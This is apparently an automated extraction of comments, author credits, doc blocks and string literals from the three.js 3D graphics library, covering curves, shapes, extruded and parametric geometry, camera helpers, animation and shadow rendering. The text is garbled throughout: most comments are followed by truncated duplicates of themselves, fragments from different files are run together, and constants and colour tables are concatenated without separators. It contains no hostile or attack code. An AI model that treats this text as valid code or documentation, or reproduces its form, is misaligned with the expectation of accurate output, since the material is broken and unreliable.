 ************************************************************* Automatically closes the path// Auto ... he path TODO// TODO If the ending of curve is not connected to the starting// If t ... tarting or the next curve, then, this is not a real path// or t ... al path TODO Test// TODO Test and verify for vector3 (needs to implement equals)// and  ... equals) Add a line curve if start and end of lines are not connected// Add  ... nnected To get accurate point with reference to// To g ... ence to entire path distance at time t,// enti ... time t, following has to be done:// foll ... e done: 1. Length of each sub path have to be known// 1. L ... e known 2. Locate and identify type of curve// 2. L ... f curve 3. Get t for the curve// 3. G ... e curve 4. Return curve.getPointAt(t')// 4. R ... tAt(t') To think about boundaries points.// To t ... points. loop where sum != 0, sum > d , sum+1 <d// loop ... um+1 <d
THREE.CurvePath.prototype.getTangent = function( t ) {
};/*\r\nTHR ... {\r\n};*/ We cannot use the default THREE.Curve getPoint() with getLength() because in// We c ... ause in THREE.Curve, getLength() depends on getPoint() but in THREE.CurvePath// THRE ... rvePath getPoint() depends on getLength// getP ... tLength Compute lengths and cache them// Comp ... he them We cannot overwrite getLengths() because UtoT mapping uses it.// We c ... ses it. We use cache values if curves and cache array are same length// We u ...  length Get length of subsurve// Get  ... ubsurve Push sums into cached array// Push ... d array Returns min and max coordinates// Retu ... dinates************************************************************
 *	Create Geometries Helpers
 *************************************************************/ Generate geometry from path points (for Line or ParticleSystem objects)/// Gen ... bjects) Generate geometry from equidistance sampling along the path// Gene ... he path************************************************************
 *	Bend / Wrap Helper Methods
 ************************************************************* Wrap path / Bend modifiers?// Wrap ... ifiers? getPoints getSpacedPoints// getP ... dPoints This returns getPoints() bend/wrapped around the contour of a path.// This ... a path. Read http://www.planetclegg.com/projects/WarpingTextToSplines.html// Read ... es.html If using actual distance, for length > path, requires line extrusions// If u ... rusionsxNorm = path.getUtoTmapping(xNorm, oldX); // 3 styles. 1) wrap stretched. 2) wrap stretch by arc length 3) warp by actual distance//xNorm ... istance check for out of bounds?// chec ... bounds?
 * @author zz85 / http://www.lab4games.net/zz85/blog
 * Creates free form 2d path using series of points, lines or curves.
 *
 * Bezier quadratic curve// Bezi ... c curve Bezier cubic curve Catmull-rom spline// Catm ...  spline Circle// Circle TODO Clean up PATH API// TODO ... ATH API Create path using straight lines to connect all points// Crea ...  points - vectors: array of Vector2// - ve ... Vector2 startPath() endPath()?// star ... Path()?Array of Vector/*Array of Vector*/---//--- FUTURE: Change the API or follow canvas API?// FUTU ... as API?if( !this.getPoint( i / divisions ) ) throw "DIE";//if( ! ...  "DIE"; if ( closedPath ) {// if ( ... ath ) { 	points.push( points[ 0 ] );// \tpoi ...  0 ] ); Return an array of vectors based on contour of the path /* Retu ... path */console.log('t', t, 'angle', angle, 'tx', tx, 'ty', ty);//conso ... ', ty);console.log(points);//conso ... oints); end switch// end switch Normalize to remove the closing point by default.// Norm ... efault. Breaks path into shapes// Brea ...  shapes	Assumptions (if parameter isCCW==true the opposite holds)://\tAssu ... holds):	- solid shapes are defined clockwise (CW)//\t- so ... se (CW)	- holes are defined counterclockwise (CCW)//\t- ho ... e (CCW)	If parameter noHoles==true://\tIf p ... ==true:  - all subPaths are regarded as solid shapes//  - a ...  shapes  - definition order CW/CCW has no relevance//  - d ... levance console.log(subPaths);// cons ... Paths);console.log("shape", shapes);//conso ... hapes); inPt on polygon contour => immediate success    or// inPt ... s    or toggling of inside/outside at every single! intersection point of an edge// togg ... an edge  with the horizontal line through inPt, left of inPt//  wit ... of inPt  not counting lowerY endpoints of edges and whole edges on that line//  not ... at line not parallel// not parallel inPt is on contour ?// inPt ... ntour ? continue;				// no intersection or edgeLowPt => doesn't count !!!// cont ... unt !!! true intersection left of inPt// true ... of inPt parallel or colinear// para ... olinear parallel// parallel egde lies on the same horizontal line as inPt// egde ... as inPt inPt: Point on contour !// inPt ... ntour ! continue;// continue; console.log("Holes first", holesFirst);// cons ... First);console.log('cw', i);//conso ... w', i);console.log('ccw', i); only Holes? -> probably all Shapes with wrong orientation// only ... ntation console.log("ambigious: ", ambigious);// cons ... gious); console.log("to change: ", toChange);// cons ... hange);
 * @author zz85 / http://www.lab4games.net/zz85/blog
 * Defines a 2d shape plane using paths.
 */**\r\n * ... .\r\n **/ STEP 1 Create a path.// STEP ... a path. STEP 2 Turn path into shape.// STEP ...  shape. STEP 3 ExtrudeGeometry takes in Shape/Shapes// STEP ... /Shapes STEP 3a - Extract points from each shape, turn to vertices// STEP ... ertices STEP 3b - Triangulate each shape, add faces.// STEP ...  faces. Convenience method to return ExtrudeGeometry// Conv ... eometry Convenience method to return ShapeGeometry Get points of holes// Get  ... f holes Get points of holes (spaced by regular distance)// Get  ... stance) Get points of shape and holes (keypoints based on segments parameter)// Get  ... ameter) THREE.Shape.prototype.extractAllPointsWithBend = function ( divisions, bend ) {// THRE ... end ) { 	return {// \treturn { 		shape: this.transform( bend, divisions ),// \t\tsh ... ions ), 		holes: this.getPointsHoles( divisions, bend )// \t\tho ...  bend ) 	};// \t}; };// }; Get points of shape and holes (spaced by regular distance) inOtherPt needs to be colinear to the inSegment// inOt ... Segment i.e. to reduce rounding errors// i.e. ...  errors intersection at endpoint of segment#1?// inte ... ment#1? intersection at endpoint of segment#2?// inte ... ment#2? return real intersection point// retu ... n point they are collinear or degenerate// they ... enerate segment1 ist just a point?// segm ...  point? segment2 ist just a point? both segments are points// both ...  points they are distinct  points// they ...  points they are the same point// they ... e point segment#1  is a single point// segm ... e point but not in segment#2// but  ... gment#2 segment#2  is a single point but not in segment#1// but  ... gment#1 they are collinear segments, which might overlap// they ... overlap the segments are NOT on a vertical line// the  ... al line the segments are on a vertical line The order of legs is important// The  ... portant translation of all points, so that Vertex is at (0,0)// tran ... t (0,0) main angle >0: < 180 deg.; 0: 180 deg.; <0: > 180 deg.// main ... 80 deg. angle != 180 deg.// angle != 180 deg. console.log( "from2to: " + from2toAngle + ", from2other: " + from2otherAngle + ", other2to: " + other2toAngle );// cons ... ngle ); main angle < 180 deg. main angle > 180 deg. angle == 180 deg.// angle == 180 deg. console.log( "from2to: 180 deg., from2other: " + from2otherAngle  );// cons ... gle  ); work on this shape// work ... s shape Check if hole point lies within angle around shape point// Chec ... e point console.log( "Vertex (Shape): " + inShapeIdx + ", Point: " + hole[inHoleIdx].x + "/" + hole[inHoleIdx].y );// cons ... x].y ); Check if shape point lies within angle around hole point console.log( "Vertex (Hole): " + inHoleIdx + ", Point: " + shape[inShapeIdx].x + "/" + shape[inShapeIdx].y ); checks for intersections with shape edges// chec ... e edges checks for intersections with hole edges search for shape-vertex and hole-vertex,// sear ... vertex, which can be connected without intersections// whic ... ections search for hole which can be reached without intersections// sear ... ections prevent multiple checks// prev ...  checks Debug only, to show the selected cuts// Debu ... ed cuts glob_CutLines.push( [ shapePt, holePt ] );// glob ... Pt ] ); hole-vertex found// hole-vertex found remember failure// remember failure shape with no holes /* shap ... oles */ To maintain reference to old shape, one must match coordinates, or offset the indices from original arrays. It's probably easier to do the first.// To m ...  first.console.log( "allpoints",allpoints, allpoints.length );//conso ... ngth ); prepare all points map// prep ... nts map remove holes by cutting paths to holes and adding them to the shape// remo ... e shape True returns indices for points of spooled shape// True ... d shapeconsole.log( "triangles",triangles, triangles.length ); check all face vertices against all points map// chec ... nts map Bezier Curves formulas obtained from// Bezi ... ed from http://en.wikipedia.org/wiki/B%C3%A9zier_curve// http ... r_curve Quad Bezier Functions// Quad ... nctions Cubic Bezier Functions// Cubi ... nctions************************************************************
 *	Line
 ************************************************************* Line curve is linear, so we can overwrite default getPointAt// Line ... PointAt************************************************************
 *	Quadratic Bezier curve
 ************************************************************* returns unit vector// retu ...  vector************************************************************
 *	Cubic Bezier curve
 *************************************************************************************************************************
 *	Spline curve
 ************************************************************* array of Vector2 /* arra ... tor2 */************************************************************
 *	Ellipse curve
 *************************************************************************************************************************
 *	Arc curve
 *************************************************************************************************************************
 *	Line3D
 ************************************************************* diff// diff************************************************************
 *	Quadratic Bezier 3D curve
 *************************************************************************************************************************
 *	Cubic Bezier 3D curve
 *************************************************************************************************************************
 *	Spline 3D curve
 ************************************************************* array of Vector3 /* arra ... tor3 */ THREE.SplineCurve3.prototype.getTangent = function(t) {// THRE ... on(t) { 		var v = new THREE.Vector3();// \t\tva ... tor3(); 		var c = [];// \t\tvar c = []; 		var points = this.points, point, intPoint, weight;// \t\tva ... weight; 		point = ( points.length - 1 ) * t;// \t\tpo ...  ) * t; 		intPoint = Math.floor( point );// \t\tin ... oint ); 		weight = point - intPoint;// \t\twe ... tPoint; 		c[ 0 ] = intPoint == 0 ? intPoint : intPoint - 1;// \t\tc[ ... nt - 1; 		c[ 1 ] = intPoint;// \t\tc[ ... tPoint; 		c[ 2 ] = intPoint  > points.length - 2 ? points.length - 1 : intPoint + 1;// \t\tc[ ... nt + 1; 		c[ 3 ] = intPoint  > points.length - 3 ? points.length - 1 : intPoint + 2;// \t\tc[ ... nt + 2; 		var pt0 = points[ c[0] ],// \t\tva ... c[0] ], 			pt1 = points[ c[1] ],// \t\t\tp ... c[1] ], 			pt2 = points[ c[2] ],// \t\t\tp ... c[2] ], 			pt3 = points[ c[3] ];// \t\t\tp ... c[3] ]; 	// t = weight;// \t// t = weight; 	v.x = THREE.Curve.Utils.tangentSpline( t, pt0.x, pt1.x, pt2.x, pt3.x );// \tv.x ... t3.x ); 	v.y = THREE.Curve.Utils.tangentSpline( t, pt0.y, pt1.y, pt2.y, pt3.y );// \tv.y ... t3.y ); 	v.z = THREE.Curve.Utils.tangentSpline( t, pt0.z, pt1.z, pt2.z, pt3.z );// \tv.z ... t3.z ); 	return v;// \treturn v;************************************************************
 *	Closed Spline 3D curve
 ************************************************************* This needs to be from 0-length +1// This ... ngth +1
 * @author mikael emtinger / http://gomo.se/
  todo: add simple tween library// todo ... library setup hierarchy// setup hierarchy loop through all keys// loop ... ll keys remove minus times// remo ... s times create quaternions// crea ... ernions prepare morph target keys// prep ... et keys get all used// get all used set all used on all frames// set  ...  frames remove all keys that are on the same time// remo ... me time set index// set index interpolation types// inte ... n types
 * @author mikael emtinger / http://gomo.se/
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
  Get keys to match our current time// Get  ... nt time Catmull-Rom spline loop through pos/rot/scl// loop ... rot/scl get keys// get keys interpolate// interpolate blend// blend Avoid paying the cost of an additional slerp if we don't have to// Avoi ... have to Get next key with// Get next key with Get previous key with// Get  ... ey with
 * @author mikael emtinger / http://gomo.se/
 * @author mrdoob / http://mrdoob.com/
 * @author alteredq / http://alteredqualia.com/
 * @author khang duong
 * @author erik kitson
 /**\r\n * ... on\r\n */ initialize to first keyframes// init ... yframes Play// Play reset key cache// reset key cache Pause// Pause Stop// Stop reset JIT matrix and remove cache// rese ... e cache Update// Update
 * @author mrdoob / http://mrdoob.com
 
 * Camera for rendering cube maps
 *	- renders scene into axis-aligned cube
 *
 * @author alteredq / http://alteredqualia.com/
 
 *	@author zz85 / http://twitter.com/blurspline / http://www.lab4games.net/zz85/blog
 *
 *	A general perpose camera, for setting FOV, Lens Focal Length,
 *		and switching between perspective and orthographic views easily.
 *		Use this only if you do not wish to manage
 *		both a Orthographic and Perspective Camera
 *
  We could also handle the projectionMatrix internally, but just wanted to test nested camera objects// We c ... objects Switches to the Perspective Camera// Swit ...  Camera Switches to the Orthographic camera estimating viewport from Perspective// Swit ... pective The size that we set is the mid plane of the viewing frustum// The  ... frustum this.cameraO.left = -farHalfWidth;// this ... fWidth; this.cameraO.right = farHalfWidth; this.cameraO.top = farHalfHeight;// this ... Height; this.cameraO.bottom = -farHalfHeight; this.cameraO.left = this.left / this.zoom;// this ... s.zoom; this.cameraO.right = this.right / this.zoom; this.cameraO.top = this.top / this.zoom; this.cameraO.bottom = this.bottom / this.zoom; For mantaining similar API with PerspectiveCamera// For  ... eCamera
* Uses Focal Length (in mm) to estimate and set FOV
* 35mm (fullframe) camera is used if frame size is not specified;
* Formula based on http://www.bobatkins.com/photography/technical/field_of_view.html
/*\r\n* U ... tml\r\n*/ should we be modifing the matrix instead?// shou ... nstead?
 * @author mrdoob / http://mrdoob.com/
 * based on http://papervision3d.googlecode.com/svn/trunk/as3/trunk/src/org/papervision3d/objects/primitives/Cube.as
 /**\r\n * ... as\r\n */ px// px nx// nx py// py ny// ny pz// pz nz// nz
 * @author hughes
  top cap// top cap bottom cap// bottom cap
 * @author zz85 / http://www.lab4games.net/zz85/blog
 *
 * Creates extruded geometry from a path shape.
 *
 * parameters = {
 *
 *  curveSegments: <int>, // number of points on the curves
 *  steps: <int>, // number of points for z-side extrusions / used for subdividing segements of extrude spline too
 *  amount: <int>, // Depth to extrude the shape
 *
 *  bevelEnabled: <bool>, // turn on bevel
 *  bevelThickness: <float>, // how deep into the original shape bevel goes
 *  bevelSize: <float>, // how far from shape outline is bevel
 *  bevelSegments: <int>, // number of bevel layers
 *
 *  extrudePath: <THREE.CurvePath> // 3d spline path to extrude shape along. (creates Frames if .frames aren't defined)
 *  frames: <THREE.TubeGeometry.FrenetFrames> // containing arrays of tangents, normals, binormals
 *
 *  material: <int> // material index for front and back faces
 *  extrudeMaterial: <int> // material index for extrusion and beveled faces
 *  uvGenerator: <Object> // object that provides UV generator functions
 *
 * }
 */**\r\n * ... }\r\n **/ can't really use automatic vertex normals// can' ... normals as then front and back sides get smoothed too// as t ... hed too should do separate smoothing just for sides// shou ... r sidesthis.computeVertexNormals();//this. ... mals();console.log( "took", ( Date.now() - startTime ) );//conso ... me ) ); 10// 10 8// 8 false// false Use default WorldUVGenerator if no UV generators are specified.// Use  ... cified.shapebb = shape.getBoundingBox();//shape ... gBox(); bevels not supported for path extrusion// beve ... trusion SETUP TNB variables// SETU ... riables Reuse TNB from TubeGeomtry for now.// Reus ... or now. TODO1 - have a .isClosed in spline?// TODO ... spline? console.log(splineTube, 'splineTube', splineTube.normals.length, 'steps', steps, 'extrudePts', extrudePts.length);// cons ... ength); Safeguards if bevels are not enabled// Safe ... enabled Variables initalization// Vari ... ization looping of holes// looping of holes Maybe we should also check if holes are in the opposite direction, just to be safe ...// Mayb ... afe ... If vertices are in order now, we shouldn't need to worry about them again (hopefully)!// If v ... fully)! Vertices /* Vertices */ vertices has all points but contour has only points of circumference// vert ... ference Find directions for point movement// Find ... ovement computes for inPt the corresponding point inPt' on a new contour// comp ... contour   shiftet by 1 unit (length of normalized vector) to the left//   sh ... he left if we walk along contour clockwise, this new contour is outside the old one// if w ... old one inPt' is the intersection of the two lines parallel to the two// inPt ... the two  adjacent edges of inPt at a distance of 1 unit on the left side.//  adj ... t side. resulting translation vector for inPt// resu ... or inPt good reading for geometry algorithms (here: line-line intersection)// good ... ection) http://geomalgorithms.com/a05-_intersect-1.html// http ... -1.html check for colinear edges// chec ... r edges not colinear// not colinear length of vectors for normalizing// leng ... alizing shift adjacent points by unit vectors to the left// shif ... he left scaling factor for v_prev to intersection point// scal ... n point vector from inPt to intersection point// vect ... n point Don't normalize!, otherwise sharp corners become ugly// Don' ... me ugly  but prevent crazy spikes//  but ...  spikes handle special case of colinear edges// hand ... r edges assumes: opposite// assumes: opposite console.log("Warning: lines are a straight sequence");// cons ... ence"); console.log("Warning: lines are a straight spike");// cons ... pike");  (j)---(i)---(k)//  (j)---(i)---(k) console.log('i,j,k', i, j , k)// cons ...  j , k) Loop bevelSegments, 1 for the front, 1 for the back// Loop ... he backfor ( b = bevelSegments; b > 0; b -- ) {//for ( ...  -- ) {z = bevelThickness * t;//z = b ... ss * t; curved// curvedbs = bevelSize * t ; // linear//bs =  ...  linear contract shape// contract shape expand holes// expand holes Back facing vertices// Back ... ertices v( vert.x, vert.y + extrudePts[ 0 ].y, extrudePts[ 0 ].x );// v( v ...  ].x ); Add stepped vertices...// Add  ... ices... Including front facing vertices// Incl ... ertices v( vert.x, vert.y + extrudePts[ s - 1 ].y, extrudePts[ s - 1 ].x ); Add bevel segments planes// Add  ...  planesfor ( b = 1; b <= bevelSegments; b ++ ) {//for ( ...  ++ ) {bs = bevelSize * ( 1-Math.sin ( ( 1 - t ) * Math.PI/2 ) );//bs =  ... /2 ) ); Faces /* Faces */ Top and bottom faces// Top  ... m faces Sides faces// Sides faces///  Internal functions/////   ... nctions steps + 1// steps + 1 Bottom faces// Bottom faces Top faces// Top faces Create faces for the z-sides of the shape// Crea ... e shape, true//, trueconsole.log('b', i,j, i-1, k,vertices.length);//conso ... ength); normal, color, material// norm ... aterial
 * @author jonobr1 / http://jonobr1.com
 *
 * Creates a one-sided polygonal geometry from a path shape. Similar to
 * ExtrudeGeometry.
 *
 * parameters = {
 *
 *	curveSegments: <int>, // number of points on the curves. NOT USED AT THE MOMENT.
 *
 *	material: <int> // material index for front and back faces
 *	uvGenerator: <Object> // object that provides UV generator functions
 *
 * }
 *
 * Add an array of shapes to THREE.ShapeGeometry.
 /**\r\n * ... y.\r\n */
 * Adds a shape to THREE.ShapeGeometry, based on THREE.ExtrudeGeometry.
  Maybe we should also check if holes are in the opposite direction, just to be safe...// Mayb ... safe... Vertices// Vertices
 * @author astrodud / http://astrodud.isgreat.org/
 * @author zz85 / https://github.com/zz85
 * @author bhouston / http://exocortex.com
  points - to create a closed torus, one must use a set of points // poin ... points     like so: [ a, b, c, d, a ], see first is the same as last.//    l ... s last. segments - the number of circumference segments to create// segm ...  create phiStart - the starting radian// phiS ...  radian phiLength - the radian (0 to 2*PI) range of the lathed section// phiL ... section    2*pi is a closed lathe, less than 2PI is a portion.//    2 ... ortion.
 * @author mrdoob / http://mrdoob.com/
 * based on http://papervision3d.googlecode.com/svn/trunk/as3/trunk/src/org/papervision3d/objects/primitives/Plane.as
 
 * @author Kaleb Murphy
 /**\r\n * ... hy\r\n */ concentric circles inside ring// conc ... de ring number of segments per circle// numb ...  circle
 * @author zz85 / http://www.lab4games.net/zz85/blog
 * @author alteredq / http://alteredqualia.com/
 *
 * For creating 3D text geometry in three.js
 *
 * Text = 3D Text
 *
 * parameters = {
 *  size: 			<float>, 	// size of the text
 *  height: 		<float>, 	// thickness to extrude text
 *  curveSegments: 	<int>,		// number of points on the curves
 *
 *  font: 			<string>,		// font name
 *  weight: 		<string>,		// font weight (normal, bold)
 *  style: 			<string>,		// font style  (normal, italics)
 *
 *  bevelEnabled:	<bool>,			// turn on bevel
 *  bevelThickness: <float>, 		// how deep into text bevel goes
 *  bevelSize:		<float>, 		// how far from text outline is bevel
 *  }
 *
 	Usage Examples

	// TextGeometry wrapper

	var text3d = new TextGeometry( text, options );

	// Complete manner

	var textShapes = THREE.FontUtils.generateShapes( text, options );
	var text3d = new ExtrudeGeometry( textShapes, options );

/*\tUsag ... ;\r\n\r\n*/ translate parameters to ExtrudeGeometry API// tran ... try API
 * @author oosmoxiecode
 * @author mrdoob / http://mrdoob.com/
 * based on http://code.google.com/p/away3d/source/browse/trunk/fp10/Away3DLite/src/away3dlite/primitives/Torus.as?r=2888
 /**\r\n * ... 88\r\n */
 * @author oosmoxiecode
 * based on http://code.google.com/p/away3d/source/browse/trunk/fp10/Away3D/src/away3d/primitives/TorusKnot.as?spec=svn2473&r=2473
 /**\r\n * ... 73\r\n */ TODO: Hack: Negating it so it faces outside.// TODO ... utside.
 * @author WestLangley / https://github.com/WestLangley
 * @author zz85 / https://github.com/zz85
 * @author miningold / https://github.com/miningold
 *
 * Modified from the TorusKnotGeometry by @oosmoxiecode
 *
 * Creates a tube which extrudes along a 3d spline
 *
 * Uses parallel transport frames as described in
 * http://www.cs.indiana.edu/pub/techreports/TR425.pdf
 /**\r\n * ... df\r\n */ proxy internals// proxy internals consruct the grid// consruct the grid construct the mesh// cons ... he mesh *** NOT NECESSARILY PLANAR ! ***// ***  ... R ! *** For computing of Frenet frames, exposing the tangents, normals and binormals the spline// For  ...  spline expose internals// expose internals compute the tangent vectors for each segment on the path// comp ... he path fixed start binormal. Has dangers of 0 vectors// fixe ... vectors This uses the Frenet-Serret formula for deriving binormal// This ... inormal last binormal x tangent// last ... tangent select an initial normal vector perpenicular to the first tangent vector,// sele ... vector, and in the direction of the smallest tangent xyz component// and  ... mponent compute the slowly-varying normal and binormal vectors for each segment on the path clamp for floating pt errors// clam ...  errors if the curve is closed, postprocess the vectors so the first and last normal vectors are the same// if t ... he same twist a little...// twist a little...
 * @author clockworkgeek / https://github.com/clockworkgeek
 * @author timothypratley / https://github.com/timothypratley
 * @author WestLangley / http://github.com/WestLangley
 Handle case when face straddles the seam// Hand ... he seam 0.9 is somewhat arbitrary// 0.9  ... bitrary Apply radius// Apply radius Merge vertices// Merge vertices Project vector onto sphere's surface// Proj ... surface Texture coords are equivalent to map coords, calculate angle and convert to fraction of a circle.// Text ... circle. Approximate a curved face with recursively sub-divided triangles.// Appr ... angles. Analytically subdivide a face to the required detail level.// Anal ...  level. Construct all of the vertices for this subdivision.// Cons ... vision. Construct all of the faces.// Cons ...  faces. Angle around the Y axis, counter-clockwise when looking from above.// Angl ...  above. Angle above the XZ plane.// Angl ...  plane. Texture fixing helper. Spheres have some odd behaviours.// Text ... viours.
 * @author timothypratley / https://github.com/timothypratley
 
 * @author zz85 / https://github.com/zz85
 * Parametric Surfaces Geometry
 * based on the brilliant article by @prideout http://prideout.net/blog/?p=44
 *
 * new THREE.ParametricGeometry( parametricFunction, uSegments, ySegements );
 *
  console.log(this);// cons ... (this); magic bullet// magic bullet var diff = this.mergeVertices();// var  ... ices(); console.log('removed ', diff, ' vertices by merging');// cons ... ging');
 * @author sroucheray / http://sroucheray.org/
 * @author mrdoob / http://mrdoob.com/
 
 * @author WestLangley / http://github.com/WestLangley
 * @author zz85 / http://github.com/zz85
 * @author bhouston / http://exocortex.com
 *
 * Creates an arrow for visualizing directions
 *
 * Parameters:
 *  dir - Vector3
 *  origin - Vector3
 *  length - Number
 *  color - color in hex value
 *  headLength - Number
 *  headWidth - Number
  dir is assumed to be normalized// dir  ... malized   5____4//   5____4 1/___0/|// 1/___0/| | 6__|_7// | 6__|_7 2/___3/// 2/___3/ TODO: Wouldn't be nice if Line had .segments?// TODO ... gments?
 * @author WestLangley / http://github.com/WestLangley
  a helper to show the world-axis-aligned bounding box for an object// a he ...  object
 * @author alteredq / http://alteredqualia.com/
 *
 *	- shows frustum, line of sight and up of the camera
 *	- suitable for fast updates
 * 	- based on frustum visualization in lightgl.js shadowmap example
 *		http://evanw.github.com/lightgl.js/tests/shadowmap.html
  near// near far// far sides// sides cone// cone up// up target// target cross// cross we need just camera projection matrix// we n ...  matrix world matrix must be identity// worl ... dentity center / target// center / target
 * @author alteredq / http://alteredqualia.com/
 * @author mrdoob / http://mrdoob.com/
 * @author WestLangley / http://github.com/WestLangley
  hardwired const OK// hard ... onst OK
 * @author mrdoob / http://mrdoob.com/
 * @author WestLangley / http://github.com/WestLangley

	var distanceGeometry = new THREE.IcosahedronGeometry( 1, 2 );
	var distanceMaterial = new THREE.MeshBasicMaterial( { color: hexColor, fog: false, wireframe: true, opacity: 0.1, transparent: true } );

	this.lightSphere = new THREE.Mesh( bulbGeometry, bulbMaterial );
	this.lightDistance = new THREE.Mesh( distanceGeometry, distanceMaterial );

	var d = light.distance;

	if ( d === 0.0 ) {

		this.lightDistance.visible = false;

	} else {

		this.lightDistance.scale.set( d, d, d );

	}

	this.add( this.lightDistance );
	
	var d = this.light.distance;

	if ( d === 0.0 ) {

		this.lightDistance.visible = false;

	} else {

		this.lightDistance.visible = true;
		this.lightDistance.scale.set( d, d, d );

	}
	/*\r\n\tva ... \t}\r\n\t*/
 * @author Sean Griffin / http://twitter.com/sgrif
 * @author Michael Guerrero / http://realitymeltdown.com
 * @author mrdoob / http://mrdoob.com/
 
 * @author alteredq / http://alteredqualia.com/
 * @author mrdoob / http://mrdoob.com/
 * @author WestLangley / http://github.com/WestLangley
 allocate maximal size// allo ... al size indexed BufferGeometry// inde ... eometry non-indexed BufferGeometry// non- ... eometry
 * Add: adds another flare
 /*\r\n *  ... re\r\n */ THREE.Texture// THREE.Texture size in pixels (-1 = use texture.width)// size ... .width) distance (0-1) from light source (0=at light source)// dist ... source) screen position (-1 => 1) z = 0 is ontop z = 1 is back// scre ... is back scale// scale rotation// rotation opacity// opacity color// color blending// blending
 * Update lens flares update positions on all flares based on the screen position
 * Set myLensFlare.customUpdateCallback to alter the flares in your project specific way.
 /*\r\n *  ... y.\r\n */ prepare default animation// prep ... imation (all frames played together in 1 second)// (all ... second) vertex// vertex uv... etc.// uv... etc. buffers// buffers
	 * Render lens flares
	 * Method: renders 16x16 0xff00ff-colored points scattered over the light source area,
	 *         reads these back and calculates occlusion.
	 *         Then _lensFlare.update_lensFlares() is called to re-position and
	 *         update transparency of flares. Then they are rendered.
	 *
	 /*\r\n\t * ... *\r\n\t */ set _lensFlare program and reset blending// set  ... lending loop through all lens flares to update their occlusion and positions// loop ... sitions setup gl and common used attribs/unforms// setu ... unforms calc object screen position// calc ... osition setup arrays for gl programs// setu ... rograms screen cull// screen cull save current RGB to temp texture// save ... texture render pink quad// render pink quad copy result to occlusionMap// copy ... sionMap restore graphics// restore graphics update object positions// upda ... sitions render flares// render flares restore gl// restore gl set GL state for depth map// set  ... pth map preprocess lights// preprocess lights 	- skip lights that are not casting shadows// \t- s ... shadows	- create virtual lights for cascaded shadow maps//\t- cr ... ow maps render depth map// render depth map compute shadow matrix// comp ...  matrix render shadow map// render shadow map set object matrices & frustum culling// set  ... culling render regular objects// rend ... objects culling is overriden globally for all objects// cull ... objects while rendering depth map// whil ... pth map need to deal with MeshFaceMaterial somehow// need ... somehow in that case just use the first of material.materials for now// in t ... for now (proper solution would require to break objects by materials// (pro ... terials  similarly to regular rendering and then set corresponding//  sim ... ponding  depth materials per each chunk instead of just once per object)//  dep ... object) set matrices and render immediate objects restore GL state// restore GL state Synchronize virtual light with the original light// Sync ... l light Fit shadow camera's ortho frustum to camera frustum// Fit  ... frustum can't really fit near/far// can' ... ear/farshadowCamera.near = _min.z;//shado ... _min.z;shadowCamera.far = _max.z;//shado ... _max.z; For the moment just ignore objects that have multiple materials with different animation methods// For  ... methods Only the first material will be taken into account for deciding which depth material to use for shadow maps// Only ... ow maps setup gl// setup gl update positions and sort// upda ... nd sort render all sprites// rend ... sprites update scene// update scene todo: create proper depth material for particles// todo ... rticles Only the first material will be taken into account for deciding which depth material to use// Only ...  to use pink square// pink square restore// restore flare// flareREVISION'67'lastTimevendors'ms''moz''webkit''o''RequestAnimationFrame''CancelAnimationFrame''CancelRequestAnimationFrame''setTimeout'currTimetimeToCall'clearTimeout'CullFaceNoneCullFaceBackCullFaceFrontCullFaceFrontBackFrontFaceDirectionCWFrontFaceDirectionCCWBasicShadowMapPCFShadowMapPCFSoftShadowMapFrontSideBackSideDoubleSideNoShadingFlatShadingSmoothShadingNoColorsFaceColorsVertexColorsNoBlendingNormalBlendingAdditiveBlendingSubtractiveBlendingMultiplyBlendingCustomBlendingAddEquationSubtractEquationReverseSubtractEquation102ZeroFactorOneFactor201SrcColorFactorOneMinusSrcColorFactor203SrcAlphaFactor204OneMinusSrcAlphaFactorDstAlphaFactor206OneMinusDstAlphaFactor207DstColorFactor208OneMinusDstColorFactor209SrcAlphaSaturateFactor210MultiplyOperationMixOperationAddOperationUVMappingCubeReflectionMappingCubeRefractionMappingSphericalReflectionMappingSphericalRefractionMappingRepeatWrappingClampToEdgeWrapping1001MirroredRepeatWrapping1002NearestFilter1003NearestMipMapNearestFilter1004NearestMipMapLinearFilter10051006LinearMipMapNearestFilter1007LinearMipMapLinearFilter1008UnsignedByteType1009ByteType1010ShortType1011UnsignedShortType1012IntType1013UnsignedIntType1014FloatType1015UnsignedShort4444Type1016UnsignedShort5551Type1017UnsignedShort565Type1018AlphaFormat10191020RGBAFormat1021LuminanceFormat1022LuminanceAlphaFormat1023RGB_S3TC_DXT1_Format2001RGBA_S3TC_DXT1_Format2002RGBA_S3TC_DXT3_Format2003RGBA_S3TC_DXT5_Format2004setRGB'number'setHexsetStyle>>setHSLhue2rgb/^rgb\((\d+), ?(\d+), ?(\d+)\)$/i/^rgb\((\d+)\%, ?(\d+)\%, ?(\d+)\%\)$/i/^\#([0-9a-f]{6})$/i/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i/^(\w+)$/iColorKeywordscopyGammaToLinearcopyLinearToGammaconvertGammaToLinearconvertLinearToGammagetHex<<getHexStringgetHSLoptionalTargethslhuelightnessgetStyle'rgb('offsetHSLaddColorscolor1color2addScalarlerpfromArray"aliceblue"0xF0F8FF"antiquewhite"0xFAEBD7"aqua"0x00FFFF"aquamarine"0x7FFFD4"azure"0xF0FFFF"beige"0xF5F5DC"bisque"0xFFE4C4"black"0x000000"blanchedalmond"0xFFEBCD"blue"0x0000FF"blueviolet"0x8A2BE2"brown"0xA52A2A"burlywood"0xDEB887"cadetblue"0x5F9EA0"chartreuse"0x7FFF00"chocolate"0xD2691E"coral"0xFF7F50"cornflowerblue"0x6495ED"cornsilk"0xFFF8DC"crimson"0xDC143C"cyan""darkblue"0x00008B"darkcyan"0x008B8B"darkgoldenrod"0xB8860B"darkgray"0xA9A9A9"darkgreen"0x006400"darkgrey""darkkhaki"0xBDB76B"darkmagenta"0x8B008B"darkolivegreen"0x556B2F"darkorange"0xFF8C00"darkorchid"0x9932CC"darkred"0x8B0000"darksalmon"0xE9967A"darkseagreen"0x8FBC8F"darkslateblue"0x483D8B"darkslategray"0x2F4F4F"darkslategrey""darkturquoise"0x00CED1"darkviolet"0x9400D3"deeppink"0xFF1493"deepskyblue"0x00BFFF"dimgray"0x696969"dimgrey""dodgerblue"0x1E90FF"firebrick"0xB22222"floralwhite"0xFFFAF0"forestgreen"0x228B22"fuchsia"0xFF00FF"gainsboro"0xDCDCDC"ghostwhite"0xF8F8FF"gold"0xFFD700"goldenrod"0xDAA520"gray"0x808080"green"0x008000"greenyellow"0xADFF2F"grey""honeydew"0xF0FFF0"hotpink"0xFF69B4"indianred"0xCD5C5C"indigo